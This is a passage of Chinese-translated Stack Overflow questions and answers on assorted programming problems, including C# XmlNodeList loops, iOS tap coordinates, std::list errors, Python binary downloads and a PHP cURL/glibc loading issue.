
> 赞同：0
> 
> 时间：2015-05-17T09:23:09.310

```
public class AndroidWalkthroughApp4 extends Activity {

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
    }

    @Override
    public void onResume() {        
        // get EditText object
        EditText editText = (EditText)this.findViewById(R.id.edit_text);

        // get preferences object
        SharedPreferences prefs = this.getPreferences(MODE_PRIVATE);
        // set text to our saved value
        editText.setText(String.valueOf(prefs.getInt("chars", 0)));

        // don't forget to do this, or your app will crash!
        super.onResume();
    }

    @Override
    public void onPause() {
        // get EditText object
        EditText editText = (EditText)this.findViewById(R.id.edit_text);

        // get preferences object
        SharedPreferences prefs = this.getPreferences(MODE_PRIVATE);
        // create editor from preferences object
        SharedPreferences.Editor editor = prefs.edit();
        // save and write length of EditText 
        editor.putInt("chars", editText.getText().length());
        editor.commit();

        // don't forget this either!
        super.onPause();
    }
} 
```

# javascript - Adapt.js 类似 Javascript 的功能

> ID：11847951
> 
> 赞同：1
> 
> 时间：2012-08-07T14:15:10.077
> 
> 标签：javascript, jquery, responsive-design

我需要为不同的屏幕尺寸或窗口大小调整执行不同的 javascript。基本上就像 adpat.js 服务 CSS 我需要服务 JS。我不知道该怎么做。基本上对于宽度低于 840 像素的任何东西，我都需要这样的东西：

```
 $('div.something').attr('id',$(this).val()); 
```

这就是我现在渲染我的 css 的方式，所以我想基本上做同样的事情，但使用 javascript 文件/函数

```
var ADAPT_CONFIG = {
      path: 'http://yourpath.com/assets/',
      dynamic: true,
      range: [
        '0px    to 480px  = mobile.css',
        '481px  to 840px  = middle.css',
        '841px  to 1440px = large.css',
        '1441px           = xlarge.css'
      ]
    }; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T18:14:12.697

你有理由不能这样做吗？

```
if($(document).width() < 840) {
 $('div.something').attr('id',$(this).val());
} 
```

# ravendb - RavenDB 复制冲突解决

> ID：11847953
> 
> 赞同：1
> 
> 时间：2012-08-07T14:15:11.373
> 
> 标签：ravendb

我在网上看过一些例子，但试图为复制冲突做出最佳选择。我想制作一个服务器插件来自动处理冲突，其中最新的文档获胜。

相比之下，我们可以在每个客户端上处理冲突，但我们同时拥有 .NET 和 PHP 客户端……作为服务器上的插件似乎更容易做到这一点？谁能确认插件路线可能是最好的路线？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T16:51:33.160

Eric，RavenDB 有插件支持 ( `AbstractDocumentReplicationConflictResolver`) 来处理这个问题。您可以通过从这里继承并将生成的 dll 添加到插件目录来教 RavenDB 如何使用自己的业务规则正确解决冲突。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-15T05:07:30.117

有人已经为你做了 [http://jtbennett.com/blog/2012/03/customizing-ravendb-a-simple-ravendb-server-bundle-for-replication-conflict-handling](http://jtbennett.com/blog/2012/03/customizing-ravendb-a-simple-ravendb-server-bundle-for-replication-conflict-handling)

# c# - Registry.GetValue()：return 语句语法问题

> ID：11847955
> 
> 赞同：0
> 
> 时间：2012-08-07T14:15:15.707
> 
> 标签：c#, wpf, windows, winapi

有人可以告诉我这个 c# 语法到底是什么意思：

```
return (int)MyPersistenceClass.GetValue(REG_ENTRY_HHHH, DEFAULT_REG_ENTRY_HHHH) == 1 
```

说 if (int)GetValue() == 1 返回值是否正确。我不确定当 (int)GetValue() != 1 时我会返回什么。非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-07T18:33:10.700

这里有几个语法。

`MyPersistenceClass.GetValue(REG_ENTRY_HHHH, DEFAULT_REG_ENTRY_HHHH)`是（可能）从注册表读取值的静态方法调用。

`(int)x`是转换为 的强制转换表达式`x`，`int`因此`(int)MyPersistenceClass.GetValue(REG_ENTRY_HHHH, DEFAULT_REG_ENTRY_HHHH)`将从注册表读取的值转换为`int`。

`==`是[相等运算符](http://msdn.microsoft.com/en-us/library/53k8ybth.aspx)。它比较两件事并返回一个`bool`值： `true`如果它们相同，`false`如果它们不同。

`return x`评估`x`，使结果成为函数的返回值并退出函数。

将它们放在一起，您的代码会从注册表中读取一个值。该值被转换为 an`int`并与 进行比较`1`。如果值是`1`函数返回`true`，否则返回`false`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:19:20.483

一个简单的三元语句将为您工作：

```
return (int)MyPersistenceClass.GetValue(REG_ENTRY_HHHH, DEFAULT_REG_ENTRY_HHHH) == 1 ? 1 : 0; 
```

因此，如果 GetValue() == 1，则返回该值。否则，返回 0。

# java - 为什么我应该使用 formlayout/formdata 而不是 setBounds？

> ID：11847959
> 
> 赞同：0
> 
> 时间：2012-08-07T14:15:30.923
> 
> 标签：java, layout, swt

创建像 a 这样简单的东西时`Combo`，为什么要使用`FormLayout`with`FormData`而不是设置边界？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T16:21:32.687

使用布局可以更轻松地支持不同的操作系统、用户设置、分辨率。它还有助于更好地处理窗口大小调整。例如，不同的操作系统有不同的字体大小（或者某些用户可能会设置不同的默认字体）——所以如果你没有在所有可能的设置上测试你的 UI，文本可能会被剪裁。

# c# - Foreach 循环 XmlNodeList

> ID：11847965
> 
> 赞同：19
> 
> 时间：2012-08-07T14:15:38.940
> 
> 标签：c#, foreach, xmldocument

目前我有以下代码：

```
XmlDocument xDoc = new XmlDocument();
xDoc.Load("http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=twitter");

XmlNodeList tweets = xDoc.GetElementsByTagName("text");
foreach (int i in tweets)
{
    if (tweets[i].InnerText.Length > 0)
    {
         MessageBox.Show(tweets[i].InnerText);
    }
} 
```

这不起作用，它让我`System.InvalidCastException`在 foreach 线上。

以下代码完美运行（没有 foreach，`i`被替换为零）：

```
XmlDocument xDoc = new XmlDocument();
xDoc.Load("http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=twitter");

XmlNodeList tweets = xDoc.GetElementsByTagName("text");

if (tweets[0].InnerText.Length > 0)
{
     MessageBox.Show(tweets[0].InnerText);
} 
```

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-07T14:44:59.623

我知道已经有一个标记的答案，但是您可以像第一次尝试那样做，您只需要将 int 替换为`XmlNode`

```
XmlDocument xDoc = new XmlDocument();
xDoc.Load("http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=twitter");

XmlNodeList tweets = xDoc.GetElementsByTagName("text");
foreach (XmlNode i in tweets)
{
    if (i.InnerText.Length > 0)
    {
         MessageBox.Show(i.InnerText);
    }
} 
```

* * *

## 回答 #2

> 赞同：29
> 
> 时间：2012-08-07T14:21:24.010

tweets 是一个节点列表。我认为你想要做的是：

```
XmlDocument xDoc = new XmlDocument();
xDoc.Load("http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=twitter");

XmlNodeList tweets = xDoc.GetElementsByTagName("text");
for (int i = 0; i < tweets.Count; i++)
{
    if (tweets[i].InnerText.Length > 0)
    {
        MessageBox.Show(tweets[i].InnerText);
    }
} 
```

* * *

## 回答 #3

> 赞同：7
> 
> 时间：2012-08-07T14:20:59.760

它不是`Int`类型，这就是您遇到强制转换异常的原因。您可以将 int 替换为适当的类型，也可以简单地使用[类型推断（隐式类型变量）](http://msdn.microsoft.com/en-us/library/bb308966.aspx)来处理这个问题。这里我使用`typeinference`.by 说 type as `var`，编译器会理解它是`tweets`集合中迭代器变量的类型

```
foreach (var i in tweets)
{
    if (i!=null)
    {
      string tweet= (((System.Xml.XmlElement)(i))).InnerText;
      MessageBox.Show(tweet);
     }
} 
```

**编辑：**使用 Wonderful [LINQtoXML](http://msdn.microsoft.com/en-us/library/bb387098.aspx)，您的代码可以像这样重写。

```
string url = "http://api.twitter.com/1/statuses/user_timeline.xml?screen_name=twitter";
XElement elm = XElement.Load(url);
if (elm != null)
{              
    foreach (var status in elm.Elements("status"))
    {
        string tweet = status.Element("text").Value;
        MessageBox.Show(ss);
    }
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-12-22T04:24:21.320

所有的答案似乎有点过时的[命令式](https://medium.freecodecamp.com/imperative-vs-declarative-programming-283e96bf8aea#.ndkvoijb8)示例，所以我将添加一个声明性的示例。这不是 OP 想要的，但我相信你会明白的。

```
 public static List<System.Xml.XmlNode> toList(System.Xml.XmlNodeList nodelist){
        List<System.Xml.XmlNode> nodes =  new List<System.Xml.XmlNode>();
        foreach (System.Xml.XmlNode node in nodelist)
        {
            nodes.Add(node);
        }
        return nodes;
    }
    public static ReadMeObject setXml(ReadMeObject readmeObject){
        readmeObject.xmlDocument = new System.Xml.XmlDocument();
        readmeObject.xmlDocument.LoadXml("<body>"+readmeObject.htmlStringContent+"</body>");
        System.Xml.XmlNodeList images =  readmeObject.xmlDocument.SelectNodes("//img");
        Array.ForEach(
            Functions.toList( images )
                .Where((image) => image.Attributes != null)
                .Where((image) => image.Attributes["src"] != null)
                .Where((image) => image.Attributes["src"].Value != "")
                .ToArray()                
            , (image) => {
                Console.WriteLine(image.Attributes["src"].Value);
            }
        );
        return readmeObject;
    } 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-11-27T00:32:06.787

```
foreach (XmlNode node in tweets)
{
    if (tweets[i].InnerText.Length > 0)
    {
         MessageBox.Show(tweets[node].InnerText);
    }
} 
```

我已将您无法使用的“I”更改为 XmlNode，它会选择列表中的一行。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2019-09-25T17:49:29.790

您可以通过 Collection 循环`.GetEnumerator()`

此代码取自 Microsoft 文档：

```
 XmlNodeList elemList = root.GetElementsByTagName("title");
 IEnumerator ienum = elemList.GetEnumerator();          
 while (ienum.MoveNext()) {   
   XmlNode title = (XmlNode) ienum.Current;
   Console.WriteLine(title.InnerText);
 } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-12-20T08:04:45.723

使用这个简单的扩展方法来遍历 XmlNodeList：

```
public static void ForEachXml<TXmlNode>(this XmlNodeList nodeList, Action<TXmlNode> action)
{
    foreach (TXmlNode node in nodeList) action(node);
} 
```

方法调用：

```
xDoc.GetElementsByTagName("text").ForEachXML<XmlNode>(tweet => 
    {
        if (tweet.InnerText.Length > 0)
            MessageBox.Show(tweet.InnerText);
    }); 
```

# ios - 如何获取自定义 UIButton 上的点击坐标？

> ID：11847972
> 
> 赞同：11
> 
> 时间：2012-08-07T14:16:00.937
> 
> 标签：ios, xcode, ipad, uibutton, storyboard

我在 iPad 上使用 XCode 4.4 为 iOS 5 开发，并在创建自定义按钮时使用 Storyboard 布局。

我的触摸事件正常工作和记录，但现在我想在我的自定义按钮上获取点击的 x/y 坐标。

如果可能的话，我希望坐标相对于自定义按钮而不是相对于整个 iPad 屏幕。

这是我在 .h 文件中的代码：

```
- (IBAction)getButtonClick:(id)sender; 
```

和我在 .m 文件中的代码：

```
 - (IBAction)getButtonClick:(id)sender {

        NSLog(@"Image Clicked.");
    } 
```

就像我说的，当我点击图像时，它会正确记录。

如何获取水龙头的坐标？

我尝试了一些来自互联网的不同示例，但是当它在日志框中显示一堆数字（可能是坐标）时，它们总是冻结。我对 iOS 开发非常陌生，所以请让它尽可能简单。谢谢！

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2012-08-07T14:25:18.450

要获得触摸位置，您可以使用按钮操作方法的另一种变体：（`myAction:forEvent:`如果您从 IB 接口创建它，请注意参数字段中的“发送者和事件”选项![在此处输入图像描述](../Images/f6ed5a784856a11ec617b47973c1403c.png)：）

然后在您的动作处理程序中，您可以从事件参数中获取触摸位置，例如：

```
- (IBAction)myAction:(UIButton *)sender forEvent:(UIEvent *)event {
    NSSet *touches = [event touchesForView:sender];
    UITouch *touch = [touches anyObject];
    CGPoint touchPoint = [touch locationInView:sender];
    NSLog(@"%@", NSStringFromCGPoint(touchPoint));
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-03-27T09:40:08.970

在 Swift 3.0 的情况下，接受的答案相同，但语法将更改如下：

**斯威夫特 3.0：**

```
 @IBAction func buyTap(_ sender: Any, forEvent event: UIEvent) {
     let myButton = sender as! UIButton
     let touches = event.touches(for: myButton)
     let touch = touches?.first
     let touchPoint = touch?.location(in: myButton)
     print("touchPoint\(touchPoint)")
  } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T16:06:37.557

对于您的整体坐标（参考屏幕），您需要创建一个`CGPoint`包含触摸坐标的坐标。但要做到这一点，你需要先接触到这一点。因此，从获取触摸事件开始，然后使用该`locationInView`方法说明这一点。现在，根据您想要记录触摸的时间——用户向下触摸或抬起手指的时间——你必须在`touchesBegan`or`touchesEnded`方法中实现此代码。假设你这样做`touchesEnded`了，它传递了一个包含所有触摸事件的 NSSet cales "touches"。

```
UITouch *tap = [touches anyObject];
CGPoint touchPoint = [tap locationInView:self.view]; 
```

“touchPoint”现在将包含用户抬起手指的点。要打印出坐标，您只需访问该点的 x 和 y 属性：

```
CGFloat pointX = touchPoint.x;
CGFloat pointY = touchPoint.y;
NSLog(@" Coordinates are: %f, %f ", pointX, pointY); 
```

那应该输出触摸的坐标。现在要将其引用到您正在使用的任何按钮，我建议您只需从该点手动减去按钮坐标的值。这似乎是一个简单的解决方案，老实说，我不知道参考另一个对象获取坐标的方法，除非您基于该对象创建视图，并将其传递给`locationInView`而不是`self.view`.

有关触摸的更多信息，这里有一组很棒的[教程](http://www.techotopia.com/index.php/An_Example_iOS_5_iPhone_Touch%2C_Multitouch_and_Tap_Application)。

# c# - 无法从 Web 服务连接到 MS 访问数据库

> ID：11847975
> 
> 赞同：2
> 
> 时间：2012-08-07T14:16:16.410
> 
> 标签：c#, web-services, iis-7, setup-deployment, ms-access-2010

我已经建立了一个 Webservice(*.asmx) 来连接到 App_Data 文件夹中的 MS Access 。每当我尝试连接并执行任何操作时，它都可以正常工作。但是当我在 IIS 上部署应用程序时，我什至无法连接到 MS 访问。有人可以指导为什么会这样吗？我也向 IIS_users 和其他用户授予了完全权限。我试图将数据库复制到不同的文件夹并访问但不能。还尝试更改应用程序池，但这也失败了。在我的 connectionstring 中，我尝试了所有组合但仍然无法。

谢谢，金谷

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T07:15:42.083

这似乎很荒谬。问题出在应用程序池上。设置应用程序池“启用 32 位应用程序”=TRUE 启用以连接 MS ACCESS。

# c++ - 在 std::list 中查找

> ID：11847977
> 
> 赞同：0
> 
> 时间：2012-08-07T14:16:22.853
> 
> 标签：c++, stl, stdlist

嗨，我从以下代码中收到编译错误。我无法弄清楚：

```
g++ stl_list_1.cc
stl_list_1.cc: In function \u2018int main()\u2019:
stl_list_1.cc:16: error: \u2018struct std::_List_iterator<int>\u2019 has no member named \u2018clist\u2019
stl_list_1.cc:19: error: \u2018struct std::_List_iterator<int>\u2019 has no member named \u2018clist\u2019
stl_list_1.cc:25: error: no match for call to \u2018(std::list<std::_List_const_iterator<int>, std::allocator<std::_List_const_iterator<int> > >) (int&)\u2019 
```

代码：

```
#include <iostream>
#include <list>
#include <algorithm>
using namespace std;

main()
{
    std::list<int> clist;
    for (int i =0; i<10; i++)
    {
        clist.push_back(i);
    }

    std::list<std::list<int>::const_iterator> list1;

    std::list<int>::iterator itr1;
    itr1 = std::find(clist.begin().clist.end(),1);
    std::list<int>::iterator itr2 ;

    itr2 = std::find(clist.begin().clist.end(),7);

    list1.push_back(itr1);
    list1.push_back(itr2);

    for(int j =0; j< list1.size(); j++)
    {
       int k = *list1[j];
       std::cout << "cvalue " << k <<std::endl;
       j++;
     }
} 
```

谢谢鲁奇

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-07T14:19:12.527

这是一个错字，您使用了点而不是逗号：

```
itr1 = std::find(clist.begin().clist.end(),1);
                              ^ 
```

它应该是这样的：

```
itr1 = std::find(clist.begin(), clist.end(),1); 
```

你在两次调用中都犯了这个错误`std::find`。

此外，您尝试`operator[]`在列表中使用，这将不起作用。代替：

```
int k = *list1[j]; 
```

你可以使用：

```
itr1 = list1.begin();
std::advance(itr1, j);
int k = *itr1; 
```

正如 JohnB 所提到的，上面的代码效率低下。孤立的，它是相同的，但是由于您在循环中使用它，所以最好只使用列表迭代器来执行迭代：

```
for(itr1 = list1.begin(); itr1 != list1.end(); ++itr1)
{
   int k = *itr1;
   std::cout << "cvalue " << k <<std::endl;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-07T14:26:22.117

```
int k = *list1[j]; 
```

那也不会编译。

也许这样的事情可能（不检查任何安全等，这是一种垃圾方式，但只是显示）

```
int k = *(find(clist.begin(), clist.end(), j)); 
```

你也增加了 j 两次，你是这个意思吗？

```
for(int j =0; j< list1.size(); j++) //here
{
   int k = *list1[j];
   std::cout << "cvalue " << k <<std::endl;
   j++; //and here?
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-07T14:21:19.200

此外，请记住

```
list1[j] 
```

不起作用，因为列表没有索引运算符，因此您必须对其进行迭代。

建议：使用 a`std::vector< int >`而不是 a `std::list< int >`。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-07T14:21:26.873

正如其他人所指出的那样，`find`调用中有一个错字（`.`而不是`,`）。

但是，一旦您过去`list`没有`[]`操作员，您就会发现该部分也无法正常工作。您需要使用迭代器在最终循环中遍历列表。

# php - Appmobi Codeigniter 和 Facebook SDK JavaScript 与 PHP

> ID：11847987
> 
> 赞同：2
> 
> 时间：2012-08-07T14:16:57.880
> 
> 标签：php, javascript, jquery, facebook, codeigniter

好的，毫无疑问，这不会是质量最好的问题。但我主要在寻找关于如何处理我正在开发的应用程序的下一阶段的建议。这是我在 appmobi 中的第一个应用程序，所以它仍然让我有些困惑。

所以一般来说，我非常习惯使用 PHP 并坚持基于浏览器的开发。就我使用 PHP FB-SDK 完成的图形 API 而言，我想对 Facebook 做的大部分事情。如果您熟悉 Appmobi，那么您知道 php 至少可以直接使用。

我正在制作的这个应用程序，我可以在我正在做的所有其他事情上正常工作。我正在与我的服务器通信，人们正在登录，人们正在注册，人们正在使用服务器以实现其价值。但是这个 Facebook 位让我难住了。我想提供 facebook 作为我的应用程序的登录/注册方式，我想从我的应用程序发布到 facebook 等待用户批准它，以及其他一些事情。但我不知道通过该应用程序解决此问题的最佳方法，因为它是迄今为止所有基于静态 html 的页面和 javascript。

所以我希望有人会通读这一切，希望你们中的一小部分人会知道一些方法来做我想做的事情，我不是在找人给我一堆代码并给我答案（那样会很好）。不，我只是在此处提到的所有层之间寻找我应该做些什么来处理这个问题。所以我可以开始构建这个部分。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-10T20:14:31.297

关于 Facebook，appMobi 最近向 API 添加了一个 Facebook 对象，您可以使用它来登录 Facebook 并访问 Facebook Graph。您可以在此处找到 Facebook API 文档：

[http://www.appmobi.com/documentation/jsAPI/facebook/index.html](http://www.appmobi.com/documentation/jsAPI/facebook/index.html)

有一个支持文档说明如何在 Facebook 方面进行设置，可以在这里找到：

[http://www.appmobi.com/documentation/index.php?DOC=FACEBOOK_INTEGRATION](http://www.appmobi.com/documentation/index.php?DOC=FACEBOOK_INTEGRATION)

我也会尽力发布一些示例代码。我正在处理完全相同的事情。

# silverlight - SpinnerStyle 不适用于 Silverlight NumericUpDownControl

> ID：11847990
> 
> 赞同：0
> 
> 时间：2012-08-07T14:17:16.890
> 
> 标签：silverlight, silverlight-toolkit

我在 Silverlight 中有一个 NumericUpDown 控件，我不想拥有微调器。

```
<Style x:Key="NoSpinner" TargetType="toolkit:Spinner">
    <Setter Property="Visibility" Value="Collapsed" />
</Style> 
```

控制：

```
<toolkit:NumericUpDown SpinnerStyle="{StaticResource NoSpinner}" /> 
```

但是旋转器仍然显示！我正在按照此控件的作者[建议的方式执行此操作 (link)](http://blog.ningzhang.org/2008/11/numericupdown-control-in-silverlight.html)。

我知道正在找到资源。没有给出错误，我可以应用在同一区域中定义的其他样式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T15:51:09.303

我没有 Blend，如果您无法访问标准模板，那么编辑这些控件的模板非常困难。对此的解决方案是获取 blend 的预览副本并使用它来重新模板化控件。

```
<Style TargetType="toolkit:NumericUpDown" x:Key="InputNumericUpDown">
    <Setter Property="Width" Value="111" />
    <Setter Property="Height" Value="23" />
    <Setter Property="IsTabStop" Value="False" />
    <Setter Property="HorizontalAlignment" Value="Left" />
    <Setter Property="Margin" Value="5,0,0,5"/>    
    <Setter Property="Template"><!-- This template was generated in Blend -->
        <Setter.Value>
            <ControlTemplate TargetType="toolkit:NumericUpDown">
                <Grid>
                    <VisualStateManager.VisualStateGroups>
                        <VisualStateGroup x:Name="CommonStates">
                            <VisualStateGroup.Transitions>
                                <VisualTransition GeneratedDuration="0"/>
                            </VisualStateGroup.Transitions>
                            <VisualState x:Name="Normal"/>
                            <VisualState x:Name="Disabled">
                                <Storyboard>
                                    <DoubleAnimation Duration="0" To="1" Storyboard.TargetProperty="(UIElement.Opacity)" Storyboard.TargetName="DisabledVisualElement"/>
                                </Storyboard>
                            </VisualState>
                        </VisualStateGroup>
                        <VisualStateGroup x:Name="FocusStates">
                            <VisualState x:Name="Focused">
                                <Storyboard>
                                    <DoubleAnimationUsingKeyFrames Storyboard.TargetProperty="Opacity" Storyboard.TargetName="FocusVisualElement">
                                        <SplineDoubleKeyFrame KeyTime="0" Value="1"/>
                                    </DoubleAnimationUsingKeyFrames>
                                </Storyboard>
                            </VisualState>
                            <VisualState x:Name="Unfocused"/>
                        </VisualStateGroup>
                    </VisualStateManager.VisualStateGroups>
                    <toolkit:ButtonSpinner x:Name="Spinner" HorizontalContentAlignment="Stretch" MinWidth="35" VerticalContentAlignment="Stretch" IsTabStop="False">
                        <TextBox x:Name="Text" AcceptsReturn="False" BorderThickness="0" Foreground="{TemplateBinding Foreground}" FontWeight="{TemplateBinding FontWeight}" FontStyle="{TemplateBinding FontStyle}" FontStretch="{TemplateBinding FontStretch}" FontSize="{TemplateBinding FontSize}" FontFamily="{TemplateBinding FontFamily}" MinWidth="20" TextAlignment="Right" TextWrapping="NoWrap" Text="{TemplateBinding Value}" IsTabStop="True">
                            <TextBox.Style>
                                <Style TargetType="TextBox">
                                    <Setter Property="Template">
                                        <Setter.Value>
                                            <ControlTemplate TargetType="TextBox">
                                                <ScrollViewer x:Name="ContentElement" BorderThickness="0" Padding="0"/>
                                            </ControlTemplate>
                                        </Setter.Value>
                                    </Setter>
                                </Style>
                            </TextBox.Style>
                        </TextBox>
                    </toolkit:ButtonSpinner>
                    <Border x:Name="DisabledVisualElement" Background="#A5FFFFFF" CornerRadius="2.5,2.5,2.5,2.5" IsHitTestVisible="false" Opacity="0"/>
                    <Border x:Name="FocusVisualElement" BorderBrush="#FF45D6FA" BorderThickness="{TemplateBinding BorderThickness}" CornerRadius="1,1,1,1" IsHitTestVisible="False" Opacity="0"/>
                </Grid>
            </ControlTemplate>
        </Setter.Value>
    </Setter>
</Style> 
```

Template 部分是唯一来自 blend 的部分，但我在 NumericUpDowns 中使用了这种样式，以使其到达您单击一次以到达控件并一次退出的位置。

# python - Python 下载 Zip 文件损坏

> ID：11847992
> 
> 赞同：0
> 
> 时间：2012-08-07T14:17:19.110
> 
> 标签：python, download, urllib2

所以，我一直在尝试制作一个简单的下载器来下载我的 zip 文件。

代码如下所示：

```
import urllib2
import os
import shutil

url = "https://dl.dropbox.com/u/29251693/CreeperCraft.zip"

file_name = url.split('/')[-1]
u = urllib2.urlopen(url)
f = open('c:\CreeperCraft.zip', 'w+')
meta = u.info()

file_size = int(meta.getheaders("Content-Length")[0])
print "Downloading: %s Bytes: %s" % (file_name, file_size)

file_size_dl = 0
block_sz = 8192
while True:
    buffer = u.read(block_sz)
    if not buffer:
        break

    file_size_dl += len(buffer)
    f.write(buffer)
    status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100\. / file_size)
    status = status + chr(8)*(len(status)+1)
    print status,

f.close() 
```

问题是，它将文件下载到正确的路径，但是当我打开文件时，它已损坏，只出现一张图片，当你点击它时，它说`File Damaged`。

请帮忙。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-07T14:20:21.353

```
f = open('c:\CreeperCraft.zip', 'wb+') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-07T14:30:03.290

您使用“w+”作为标志，Python 以*文本*模式打开文件：

> Windows 上的 Python 区分了文本文件和二进制文件；读取或写入数据时，文本文件中的行尾字符会自动稍作更改。这种对文件数据的幕后修改适用于 ASCII 文本文件，但它会破坏 JPEG 或 EXE 文件中的二进制数据。

[http://docs.python.org/tutorial/inputoutput.html#reading-and-writing-files](http://docs.python.org/tutorial/inputoutput.html#reading-and-writing-files)

另外，请注意您应该转义反斜杠或使用原始字符串，因此请使用 `open('c:\\CreeperCraft.zip', 'wb+')`.

我还建议您不要手动复制原始字节字符串，而是使用`shutil.copyfileobj`- 它使您的代码更紧凑且更易于理解。我也喜欢使用`with`自动清理资源的语句（即关闭文件：

```
import urllib2, shutil

url = "https://dl.dropbox.com/u/29251693/CreeperCraft.zip"
with urllib2.urlopen(url) as source, open('c:\CreeperCraft.zip', 'w+b') as target:
  shutil.copyfileobj(source, target) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-07T14:21:54.057

```
import posixpath
import sys
import urlparse
import urllib

url = "https://dl.dropbox.com/u/29251693/CreeperCraft.zip"
filename = posixpath.basename(urlparse.urlsplit(url).path)
def print_download_status(block_count, block_size, total_size):
    sys.stderr.write('\r%10s bytes of %s' % (block_count*block_size, total_size))
filename, headers = urllib.urlretrieve(url, filename, print_download_status) 
```

# php - cURL 7.27.0-1 无法通过 Apache PHP 加载，但在 php 命令行上运行良好

> ID：11847996
> 
> 赞同：1
> 
> 时间：2012-08-07T14:17:30.903
> 
> 标签：php, linux, apache, curl, archlinux

我们有一个 Intranet 站点，其中包含多个使用 curl_init() 开始的 PHP 脚本。前几天 ArchLinux 的更新与 cURL (glibc) 的一些依赖关系混淆了。这导致 curl 模块无法在 PHP 中正确加载，即 extension_loaded('curl') 失败。

我从 Apache /var/http/error_log 收到此错误：

> PHP 警告：PHP 启动：无法加载动态库“/usr/lib/php/modules/curl.so” - /lib/libc.so.6：未找到版本“GLIBC_2.16”（/usr/lib 需要/libcurl.so.4) 在第 0 行的未知中

*   奇怪的是，我们有另一个几乎相同的脚本（在同一台机器上）使用 curl_init() 在 PHP 命令行上运行，该脚本通过 cron 作业运行，并且 PHP 在执行此脚本期间正确加载 cURL。这工作得很好。
*   cURL 配置为通过 extension=curl.so 在 php.ini 中运行
*   如果我检查 phpinfo()，我会看到“--with-curl=shared”。但是它不显示 cURL 信息表。这告诉我模块没有正确加载。
*   curl.so 文件位于：/usr/lib/php/modules/curl.so
*   这些 cURL 脚本通常也可以正常运行，它们目前在另一台测试机器上运行良好。
*   这个问题发生在 PHP 5.4.5

ldd /usr/lib/libcurl.so.4

```
linux-gate.so.1 (0xb7770000)
libssh2.so.1 => /lib/libssh2.so.1 (0xb76de000)
librt.so.1 => /lib/librt.so.1 (0xb76d5000)
libssl.so.1.0.0 => /lib/libssl.so.1.0.0 (0xb7673000)
libcrypto.so.1.0.0 => /lib/libcrypto.so.1.0.0 (0xb74ad000)
libz.so.1 => /lib/libz.so.1 (0xb7495000)
libpthread.so.0 => /lib/libpthread.so.0 (0xb747a000)
libc.so.6 => /lib/libc.so.6 (0xb72d4000)
libdl.so.2 => /lib/libdl.so.2 (0xb72cf000)
/lib/ld-linux.so.2 (0xb7771000) 
```

在我的发行版中，他们所做的更改是 /lib 现在是 /usr/lib 的符号链接：[http ://www.archlinux.org/news/the-lib-directory-becomes-a-symlink/](http://www.archlinux.org/news/the-lib-directory-becomes-a-symlink/)

*编辑*

我尝试了 DaveRandom 在这里建议的...

```
[root http]# php -r " echo (file_exists('/usr/lib/php/modules/curl.so')) ? 'It exists.' : 'It doesn\'t e.'; "
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/modules/json.so' - /usr/lib/php/modules/json.so: cannot open shared object file: No such file or directory in Unknown on line 0
PHP Warning:  file_exists(): open_basedir restriction in effect. File(/usr/lib/php/modules/curl.so) is not within the allowed path(s): (/srv/http/:/home/:/tmp/:/usr/share/pear/) in Command line code on line 1

Warning: file_exists(): open_basedir restriction in effect. File(/usr/lib/php/modules/curl.so) is not within the allowed path(s): (/srv/http/:/home/:/tmp/:/usr/share/pear/) in Command line code on line 1
It doesn't exist. 
```

它失败了，因为它不允许通过ini访问该路径，所以我重新配置它并再次尝试......

```
[root http]# php -r " echo (file_exists('/usr/lib/php/modules/curl.so')) ? 'It exists.' : 'It doesn\'t exist.'; "
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/modules/json.so' - /usr/lib/php/modules/json.so: cannot open shared object file: No such file or directory in Unknown on line 0
It exists. 
```

奇怪的是 JSON 实际上正在工作......

```
[root m]# php -r " echo (extension_loaded('json')) ? 'It is loaded' : 'It is not loaded'; "
PHP Warning:  PHP Startup: Unable to load dynamic library '/usr/lib/php/modules/json.so' - /usr/lib/php/modules/json.so: cannot open shared object file: No such file or directory in Unknown on line 0
It is loaded 
```

我想问题是，什么会导致 cURL 在命令行上工作，模块文件在那里，但无法通过 Apache PHP 加载扩展。

那么另一方面，什么会导致 JSON 发出警告，但实际上仍然加载？

有谁知道这到底是什么鬼？

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-07T19:01:28.337

好吧，我找到了解决办法。基本上只是**从 cURL 7.27.0-1 降级到 7.26.0-1**，这是哪种sux，但它有效：

我认为这个问题是 ArchLinux 独有的，但这将解决它（如果你是像我这样的 ArchLinux 用户）。

```
mkdir /tmp/pacman_build
